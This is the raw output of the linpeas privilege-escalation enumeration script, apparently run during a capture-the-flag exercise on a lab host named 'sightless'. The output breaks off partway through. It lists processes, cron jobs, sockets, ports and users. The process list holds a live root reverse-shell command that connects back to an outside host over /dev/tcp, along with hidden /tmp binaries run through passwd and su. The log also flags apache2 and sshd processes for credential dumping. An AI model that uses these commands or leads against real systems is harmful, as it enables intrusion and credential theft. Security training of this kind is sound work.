root         843  0.0  0.1  15544  5260 ?        Ss   Jan08   0:01 /lib/systemd/systemd-logind
root         844  0.0  0.1 392608  6780 ?        Ssl  Jan08   0:00 /usr/libexec/udisks2/udisksd
root         890  0.0  0.1 317972  4924 ?        Ssl  Jan08   0:00 /usr/sbin/ModemManager
root        1089  0.0  0.0   6896  2192 ?        Ss   Jan08   0:01 /usr/sbin/cron -f -P
root        1119  0.0  0.0  10348  1688 ?        S    Jan08   0:00  _ /usr/sbin/CRON -f -P
john        1135  0.0  0.0   2892   744 ?        Ss   Jan08   0:00  |   _ /bin/sh -c sleep 140 && /home/john/automation/healthcheck.sh
john        1602  0.0  0.0   7372  2680 ?        S    Jan08   0:03  |       _ /bin/bash /home/john/automation/healthcheck.sh
john      124855  0.0  0.0   5772  1112 ?        S    21:20   0:00  |           _ sleep 60
root        1120  0.0  0.0  10348  1688 ?        S    Jan08   0:00  _ /usr/sbin/CRON -f -P
john        1136  0.0  0.0   2892   748 ?        Ss   Jan08   0:00      _ /bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py
john        1509  0.0  0.2  33660  9532 ?        S    Jan08   2:14          _ /usr/bin/python3 /home/john/automation/administration.py
john        1510  0.5  0.2 33630172 8108 ?       Sl   Jan08  13:57              _ /home/john/automation/chromedriver --port=57873
john        1521  0.8  1.1 34011320 45200 ?      Sl   Jan08  23:50              |   _ /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.RUPisW data:,
john        1527  0.0  0.0 34112452 3816 ?       S    Jan08   0:00              |       _ /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1523 --enable-crash-reporter
john        1544  0.6  0.8 34362344 35024 ?      Sl   Jan08  19:03              |       |   _ /opt/google/chrome/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --headless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=1523 --gpu-preferences=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --shared-files --fie
john        1528  0.0  0.1 34112456 5336 ?       S    Jan08   0:00              |       _ /opt/google/chrome/chrome --type=zygote --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1523 --enable-crash-reporter
john        1574  3.7  3.8 1186799476 153160 ?   Sl   Jan08 104:05              |       |   _ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1523 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1736377751598174 --launc
john        1545  0.1  0.8 33900068 31792 ?      Sl   Jan08   5:19              |       _ /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-sandbox --disable-dev-shm-usage --use-angle=swiftshader-webgl --use-gl=angle --headless --crashpad-handler-pid=1523 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,8816647854629467409,5516225544909747094,262144 --disable-features=PaintHolding --variations-seed-version --enable-logging --log-level=0 --enable-crash-reporter
root        1103  0.0  0.3 1874776 15364 ?       Ssl  Jan08   2:18 /usr/bin/containerd
root        1117  0.0  0.0   6176   756 tty1     Ss+  Jan08   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
michael   122772  0.0  0.2  17296  8016 ?        S    21:15   0:00      _ sshd: michael@pts/0
michael   122773  0.0  0.1   8788  5504 pts/0    Ss   21:15   0:00          _ -bash
michael   122870  0.1  0.0   3872  2812 pts/0    S+   21:19   0:00              _ /bin/sh ./linpeas.sh
michael   125974  0.0  0.0   3872  1072 pts/0    S+   21:21   0:00                  _ /bin/sh ./linpeas.sh
michael   125976  0.0  0.0  10500  3908 pts/0    R+   21:21   0:00                  |   _ ps fauxwww
michael   125978  0.0  0.0   3872  1072 pts/0    S+   21:21   0:00                  _ /bin/sh ./linpeas.sh
root        1139  0.0  0.0  55228   112 ?        Ss   Jan08   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
www-data    1140  0.0  0.0  55896  3072 ?        S    Jan08   1:39  _ nginx: worker process
www-data    1141  0.1  0.0  56048  3260 ?        S    Jan08   2:47  _ nginx: worker process
root        1146  0.0  0.1 225884  4940 ?        Ss   Jan08   0:15 /usr/sbin/apache2 -k start
www-data  103280  0.1  0.4 301540 19180 ?        S    07:25   1:21  _ /usr/sbin/apache2 -k start
www-data  103281  0.1  0.4 227936 18892 ?        S    07:25   1:23  _ /usr/sbin/apache2 -k start
www-data  103282  0.1  0.5 301672 19988 ?        S    07:25   1:23  _ /usr/sbin/apache2 -k start
www-data  103283  0.1  0.4 227808 18836 ?        S    07:25   1:21  _ /usr/sbin/apache2 -k start
www-data  103284  0.1  0.4 227936 18796 ?        S    07:25   1:23  _ /usr/sbin/apache2 -k start
www-data  103285  0.1  0.4 227808 18864 ?        S    07:25   1:21  _ /usr/sbin/apache2 -k start
www-data  108686  0.1  0.4 227808 19336 ?        S    11:14   0:58  _ /usr/sbin/apache2 -k start
mysql       1155  1.1  7.0 1832048 278140 ?      Ssl  Jan08  33:01 /usr/sbin/mysqld
root        1157  0.0  0.6 2051668 24400 ?       Ssl  Jan08   0:37 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1374  0.0  0.0 1819792 3524 ?        Sl   Jan08   0:43  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
proftpd     1159  0.0  0.0  30616  3576 ?        SLs  Jan08   0:22 proftpd: (accepting connections)
root        1409  0.0  0.1 1238400 4180 ?        Sl   Jan08   0:37 /usr/bin/containerd-shim-runc-v2 -namespace moby -id c184118df0a6eb770d018766ef8e32c948924b0ba77d85ec04a32e50cbafcb3a -address /run/containerd/containerd.sock
root        1434  0.0  1.4 994040 58276 ?        Ssl  Jan08   2:25  _ node /usr/app/server.js
root      122332  0.0  0.0   2392   636 ?        S    20:59   0:00      _ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.10.14.46/1337 0>&1"
root      122334  0.0  0.0   3740  2784 ?        S    20:59   0:00          _ bash -c bash -i >& /dev/tcp/10.10.14.46/1337 0>&1
root      122336  0.0  0.0   3872  3104 ?        S    20:59   0:00              _ bash -i
john        1523  0.0  0.0 33575860 2268 ?       Sl   Jan08   0:00 /opt/google/chrome/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --database=/tmp/Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=lsb-release=Ubuntu 22.04.4 LTS --annotation=plat=Linux --annotation=prod=Chrome_Headless --annotation=ver=125.0.6422.60 --initial-client-fd=6 --shared-client-connection
root        3780  0.0  0.1 239656  5072 ?        Ssl  Jan09   0:00 /usr/libexec/upowerd
michael    79454  0.0  0.0  17084  2440 ?        Ss   04:28   0:00 /lib/systemd/systemd --user
michael    79455  0.0  0.0 169324   524 ?        S    04:28   0:00  _ (sd-pam)
michael    92488  0.0  0.0  81388   652 ?        SLs  05:23   0:00  _ /usr/bin/gpg-agent --supervised
michael   101472  0.0  0.0   2892   852 ?        S    06:29   0:00 /bin/sh -c /tmp/.nxhgyadgv /bin/passwd
michael   101473  0.0  0.0    196     0 ?        S    06:29   0:00  _ /tmp/.nxhgyadgv /bin/passwd
root      101474  0.0  0.0   6668  1900 ?        S    06:29   0:00      _ /bin/passwd
michael   101526  0.0  0.0   2892   776 ?        S    06:30   0:00 /bin/sh -c /tmp/.dvcfpfjuo /bin/passwd
michael   101527  0.0  0.0    196     0 ?        S    06:30   0:00  _ /tmp/.dvcfpfjuo /bin/passwd
root      101528  0.0  0.0   6668  1904 ?        S    06:30   0:00      _ /bin/passwd
michael   101628  0.0  0.0   2892   780 ?        S    06:32   0:00 /bin/sh -c su - root -c /tmp/FMibbBhP
root      101629  0.0  0.0   9748  1904 ?        S    06:32   0:00  _ su - root -c /tmp/FMibbBhP
michael   101655  0.0  0.0   2892   764 ?        S    06:33   0:00 /bin/sh -c su - root -c /tmp/RiiFAkvA
root      101656  0.0  0.0   9748  2016 ?        S    06:33   0:00  _ su - root -c /tmp/RiiFAkvA
michael   101668  0.0  0.0   2892   772 ?        S    06:34   0:00 /bin/sh -c su - root -c /tmp/ApixkFXE
root      101669  0.0  0.0   9748  1888 ?        S    06:34   0:00  _ su - root -c /tmp/ApixkFXE
root      121619  0.0  0.8 391532 32184 ?        Ssl  20:29   0:00 /usr/libexec/fwupd/fwupd


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user
Proc 579 with ppid 1 is run by user systemd-network but the ppid user is root
Proc 759 with ppid 1 is run by user systemd-resolve but the ppid user is root
Proc 760 with ppid 1 is run by user systemd-timesync but the ppid user is root
Proc 766 with ppid 763 is run by user _laurel but the ppid user is root
Proc 824 with ppid 1 is run by user messagebus but the ppid user is root
Proc 841 with ppid 1 is run by user syslog but the ppid user is root
Proc 1135 with ppid 1119 is run by user john but the ppid user is root
Proc 1136 with ppid 1120 is run by user john but the ppid user is root
Proc 1140 with ppid 1139 is run by user www-data but the ppid user is root
Proc 1141 with ppid 1139 is run by user www-data but the ppid user is root
Proc 1155 with ppid 1 is run by user mysql but the ppid user is root
Proc 1159 with ppid 1 is run by user proftpd but the ppid user is root
Proc 1523 with ppid 1 is run by user john but the ppid user is root
Proc 79454 with ppid 1 is run by user michael but the ppid user is root
Proc 101472 with ppid 1 is run by user michael but the ppid user is root
Proc 101526 with ppid 1 is run by user michael but the ppid user is root
Proc 101628 with ppid 1 is run by user michael but the ppid user is root
Proc 101655 with ppid 1 is run by user michael but the ppid user is root
Proc 101668 with ppid 1 is run by user michael but the ppid user is root
Proc 103280 with ppid 1146 is run by user www-data but the ppid user is root
Proc 103281 with ppid 1146 is run by user www-data but the ppid user is root
Proc 103282 with ppid 1146 is run by user www-data but the ppid user is root
Proc 103283 with ppid 1146 is run by user www-data but the ppid user is root
Proc 103284 with ppid 1146 is run by user www-data but the ppid user is root
Proc 103285 with ppid 1146 is run by user www-data but the ppid user is root
Proc 108686 with ppid 1146 is run by user www-data but the ppid user is root
Proc 122772 with ppid 122770 is run by user michael but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND      PID    TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root    1136 Mar 23  2022 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Sep  3 08:19 .
drwxr-xr-x 114 root root 4096 Sep  3 08:19 ..
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rw-r-----   1 root root  898 Jan 10 07:20 froxlor
-rw-r--r--   1 root root  712 Jan 28  2022 php
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.daily:
total 36
drwxr-xr-x   2 root root 4096 Sep  3 08:19 .
drwxr-xr-x 114 root root 4096 Sep  3 08:19 ..
-rwxr-xr-x   1 root root  539 Dec  4  2023 apache2
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat
-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
lrwxrwxrwx   1 root root   37 May 14  2024 google-chrome -> /opt/google/chrome/cron/google-chrome
-rwxr-xr-x   1 root root  377 May 25  2022 logrotate
-rwxr-xr-x   1 root root 1330 Mar 17  2022 man-db
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Aug  9 11:17 .
drwxr-xr-x 114 root root 4096 Sep  3 08:19 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Aug  9 11:17 .
drwxr-xr-x 114 root root 4096 Sep  3 08:19 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x   2 root root 4096 Aug  9 11:17 .
drwxr-xr-x 114 root root 4096 Sep  3 08:19 ..
-rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

SHELL=/bin/sh

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers
NEXT                        LEFT          LAST                        PASSED               UNIT                           ACTIVATES
Fri 2025-01-10 21:39:00 UTC 17min left    Fri 2025-01-10 21:09:02 UTC 12min ago            phpsessionclean.timer          phpsessionclean.service
Fri 2025-01-10 23:14:37 UTC 1h 52min left Thu 2025-01-09 23:14:37 UTC 22h ago              update-notifier-download.timer update-notifier-download.service
Fri 2025-01-10 23:24:14 UTC 2h 2min left  Thu 2025-01-09 23:24:14 UTC 21h ago              systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
Sat 2025-01-11 00:00:00 UTC 2h 38min left Fri 2025-01-10 00:00:01 UTC 21h ago              dpkg-db-backup.timer           dpkg-db-backup.service
Sat 2025-01-11 00:00:00 UTC 2h 38min left Fri 2025-01-10 00:00:01 UTC 21h ago              logrotate.timer                logrotate.service
Sat 2025-01-11 00:29:33 UTC 3h 7min left  Fri 2025-01-10 16:06:07 UTC 5h 15min ago         apt-daily.timer                apt-daily.service
Sat 2025-01-11 06:03:19 UTC 8h left       Fri 2025-01-10 02:49:48 UTC 18h ago              man-db.timer                   man-db.service
Sat 2025-01-11 06:09:00 UTC 8h left       Fri 2025-01-10 06:35:02 UTC 14h ago              apt-daily-upgrade.timer        apt-daily-upgrade.service
Sat 2025-01-11 11:18:30 UTC 13h left      Fri 2025-01-10 12:58:12 UTC 8h ago               motd-news.timer                motd-news.service
Sat 2025-01-11 13:00:11 UTC 15h left      Fri 2025-01-10 20:29:14 UTC 52min ago            fwupd-refresh.timer            fwupd-refresh.service
Sun 2025-01-12 03:00:21 UTC 1 day 5h left Wed 2024-07-31 13:06:21 UTC 5 months 11 days ago update-notifier-motd.timer     update-notifier-motd.service
Sun 2025-01-12 03:10:37 UTC 1 day 5h left Wed 2025-01-08 23:09:54 UTC 1 day 22h ago        e2scrub_all.timer              e2scrub_all.service
Mon 2025-01-13 00:58:40 UTC 2 days left   Thu 2025-01-09 00:22:25 UTC 1 day 20h ago        fstrim.timer                   fstrim.service
n/a                         n/a           n/a                         n/a                  apport-autoreport.timer        apport-autoreport.service
n/a                         n/a           n/a                         n/a                  ua-timer.timer                 ua-timer.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
/etc/systemd/system/multi-user.target.wants/grub-common.service could be executing some relative path
/etc/systemd/system/multi-user.target.wants/systemd-networkd.service could be executing some relative path
/etc/systemd/system/sleep.target.wants/grub-common.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
/org/kernel/linux/storage/multipathd
/run/containerd/containerd.sock
/run/containerd/containerd.sock.ttrpc
/run/containerd/s/a360e3a5b8f72d95704f3b097f7ef13ee43ba273e716299750b0fbca597cec5f
/run/dbus/system_bus_socket
  └─(Read Write)
/run/docker.sock
/run/irqbalance/irqbalance834.sock
  └─(Read )
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/mysqld/mysqlx.sock
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/resolve/io.systemd.Resolve
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/user/1000/bus
  └─(Read Write)
/run/user/1000/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1000/pk-debconf-socket
  └─(Read Write)
/run/user/1000/systemd/inaccessible/sock
/run/user/1000/systemd/notify
  └─(Read Write)
/run/user/1000/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/docker/libnetwork/bf128ebb5287.sock
/var/run/docker/metrics.sock
/var/run/mysqld/mysqld.sock
  └─(Read Write)
/var/run/mysqld/mysqlx.sock
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
NAME                             PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION
:1.0                             760 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -
:1.1                             759 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service    -       -
:1.148                         79454 systemd         michael          :1.148        user@1000.service           -       -
:1.199                        121619 fwupd           root             :1.199        fwupd.service               -       -
:1.2                               1 systemd         root             :1.2          init.scope                  -       -
:1.206                        131334 busctl          michael          :1.206        session-1428.scope          1428    -
:1.21                           1521 chrome          john             :1.21         cron.service                -       -
:1.22                           1521 chrome          john             :1.22         cron.service                -       -
:1.29                           3780 upowerd         root             :1.29         upower.service              -       -
:1.3                             579 systemd-network systemd-network  :1.3          systemd-networkd.service    -       -
:1.4                             844 udisksd         root             :1.4          udisks2.service             -       -
:1.5                             840 polkitd         root             :1.5          polkit.service              -       -
:1.6                             843 systemd-logind  root             :1.6          systemd-logind.service      -       -
:1.7                             890 ModemManager    root             :1.7          ModemManager.service        -       -
:1.9                             836 networkd-dispat root             :1.9          networkd-dispatcher.service -       -
com.ubuntu.SoftwareProperties      - -               -                (activatable) -                           -       -
org.freedesktop.DBus               1 systemd         root             -             init.scope                  -       -
org.freedesktop.ModemManager1    890 ModemManager    root             :1.7          ModemManager.service        -       -
org.freedesktop.PackageKit         - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1       840 polkitd         root             :1.5          polkit.service              -       -
org.freedesktop.UDisks2          844 udisksd         root             :1.4          udisks2.service             -       -
org.freedesktop.UPower          3780 upowerd         root             :1.29         upower.service              -       -
org.freedesktop.bolt               - -               -                (activatable) -                           -       -
org.freedesktop.fwupd         121619 fwupd           root             :1.199        fwupd.service               -       -
org.freedesktop.hostname1          - -               -                (activatable) -                           -       -
org.freedesktop.locale1            - -               -                (activatable) -                           -       -
org.freedesktop.login1           843 systemd-logind  root             :1.6          systemd-logind.service      -       -
org.freedesktop.network1         579 systemd-network systemd-network  :1.3          systemd-networkd.service    -       -
org.freedesktop.resolve1         759 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service    -       -
org.freedesktop.systemd1           1 systemd         root             :1.2          init.scope                  -       -
org.freedesktop.thermald           - -               -                (activatable) -                           -       -
org.freedesktop.timedate1          - -               -                (activatable) -                           -       -
org.freedesktop.timesync1        760 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:6f:a1:a9:67  txqueuelen 0  (Ethernet)
        RX packets 164407  bytes 72852513 (72.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 223476  bytes 33143971 (33.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.32  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:b0:1b:24  txqueuelen 1000  (Ethernet)
        RX packets 2778892  bytes 465272200 (465.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2619048  bytes 984204612 (984.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 7302180  bytes 8700459733 (8.7 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7302180  bytes 8700459733 (8.7 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vetha676efc: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether de:4a:19:8e:e8:36  txqueuelen 0  (Ethernet)
        RX packets 164407  bytes 75154211 (75.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 223476  bytes 33143971 (33.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Hostname, hosts and DNS
sightless
127.0.0.1 localhost
127.0.1.1 sightless
127.0.0.1 sightless.htb sqlpad.sightless.htb admin.sightless.htb

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad
search .

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35497         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:57873         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44095         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users
uid=1000(michael) gid=1000(michael) groups=1000(michael)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid


╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens
ptrace protection is enabled (1)

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
john:x:1001:1001:,,,:/home/john:/bin/bash
michael:x:1000:1000:michael:/home/michael:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(michael) gid=1000(michael) groups=1000(michael)
uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=101(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=102(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=103(messagebus) gid=104(messagebus) groups=104(messagebus)
uid=104(systemd-timesync) gid=105(systemd-timesync) groups=105(systemd-timesync)
uid=105(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(syslog) gid=113(syslog) groups=113(syslog),4(adm)
uid=108(uuidd) gid=114(uuidd) groups=114(uuidd)
uid=109(tcpdump) gid=115(tcpdump) groups=115(tcpdump)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(tss) gid=116(tss) groups=116(tss)
uid=111(landscape) gid=117(landscape) groups=117(landscape)
uid=112(fwupd-refresh) gid=118(fwupd-refresh) groups=118(fwupd-refresh)
uid=113(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=114(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=115(mysql) gid=120(mysql) groups=120(mysql)
uid=116(proftpd) gid=65534(nogroup) groups=65534(nogroup)
uid=117(ftp) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(_laurel) gid=998(_laurel) groups=998(_laurel)
uid=999(lxd) gid=100(users) groups=100(users)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
